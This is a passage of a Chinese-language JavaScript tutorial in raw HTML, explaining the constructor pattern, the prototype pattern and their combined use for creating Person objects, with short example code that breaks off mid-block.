rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“alert(this.name);”</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“Software”</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){<br>}<br>Person.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){<br> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br>person1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; 